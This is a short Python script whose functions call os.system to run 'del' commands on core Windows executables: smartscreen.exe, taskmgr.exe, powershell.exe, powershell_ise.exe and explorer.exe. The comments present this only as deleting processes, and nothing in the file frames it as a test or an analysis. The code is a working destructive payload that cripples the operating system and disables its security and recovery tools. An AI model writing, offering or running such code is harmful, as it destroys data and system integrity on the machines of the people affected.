#!/usr/bin/python
#coding:utf-8
import os, sys, time

# Function to delete process in the directory specified
def remove_pwsst():
    procs = ['smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        cmd = "del \\windows\\system32\\%s " %(proc)
        os.system(cmd)
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for proc in pwr_sh:
        cmd = "del \\windows\\system32\\WindowsPowerShell\\v1.0\\%s " %(proc)
        os.system(cmd)
# Function to delete gui process on windows
def remove_exp():
    cmd = "del \\windows\\explorer.exe "
    os.system(cmd)
